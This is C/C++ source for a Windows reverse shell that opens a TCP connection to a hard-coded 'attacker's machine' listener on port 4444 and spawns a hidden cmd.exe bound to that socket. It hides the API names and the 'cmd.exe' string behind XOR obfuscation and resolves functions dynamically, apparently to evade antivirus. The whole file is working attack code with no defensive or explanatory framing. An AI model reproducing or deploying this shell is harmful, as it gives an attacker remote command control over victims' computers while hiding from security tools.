
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "helpers.h"
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")
#include <iostream>
using namespace std;
WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

#pragma comment(linker, "/entry:WinMain")

void XOR_Decrypt(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}


typedef BOOL (WINAPI * CreateProcessA_t)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef SOCKET  (WINAPI * WSASocketA_t)(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);

typedef int (WINAPI * WSAStartup_t)(
        
        WORD      wVersionRequired,
        LPWSADATA lpWSAData
);

typedef int (WINAPI * WSAConnect_t)(
  SOCKET         s,
  const sockaddr *name,
  int            namelen,
  LPWSABUF       lpCallerData,
  LPWSABUF       lpCalleeData,
  LPQOS          lpSQOS,
  LPQOS          lpGQOS
);
int main(void)
{
    // FreeConsole();
  // listener ip, port on attacker's machine
  char *ip = "192.168.47.131";
  short port = 4444;
  char key[] = "ahmed";

  //CreateProcees function Obfuscation
  char CreateProcEncrypted[] = { 0x22, 0x1a, 0x8, 0x4, 0x10, 0x4, 0x38, 0x1f, 0xa, 0x7, 0x4, 0x1b, 0x1e, 0x24 };
  int CreateProcLegnth = sizeof(CreateProcEncrypted);
  XOR_Decrypt((char *) CreateProcEncrypted, CreateProcLegnth, key, sizeof(key));



cout << CreateProcEncrypted<< endl;
  //cmd Word Function obfustaion
  char cmdWordObfuscation[] ={ 0x2, 0x5, 0x9, 0x4b, 0x1, 0x19, 0xd };
  unsigned int cmdWordObfuscationSize = sizeof(CreateProcEncrypted);
  XOR_Decrypt((char *) cmdWordObfuscation, strlen(cmdWordObfuscation), key, sizeof(key));

cout << cmdWordObfuscation<< endl;


  // WSAStartup Obfuscation 
  char wsaStartObfus[] = { 0x36, 0x3b, 0x2c, 0x36, 0x10, 0x0, 0x1a, 0x19, 0x10, 0x14 };
  unsigned int wsaStartObfusSize = sizeof(CreateProcEncrypted);
  XOR_Decrypt((char *) wsaStartObfus, wsaStartObfusSize, key, sizeof(key));
cout <<  wsaStartObfus<< endl ;

  CreateProcessA_t pCreateProcessA = (CreateProcessA_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "CreateProcessA");
  WSAStartup_t pWSAStartup_t = (WSAStartup_t) GetProcAddress(GetModuleHandle("Ws2_32.dll"), "WSAStartup");
  WSAConnect_t pWSAConnect_t = (WSAConnect_t) GetProcAddress(GetModuleHandle("Ws2_32.dll"), "WSAConnect");
  WSASocketA_t pWSASocketA_t = (WSASocketA_t) GetProcAddress(GetModuleHandle("Ws2_32.dll"), "WSASocketA");

  // init socket lib
  pWSAStartup_t(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = pWSASocketA_t(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  pWSAConnect_t(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

 
  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;


  pCreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);

  exit(0);
}
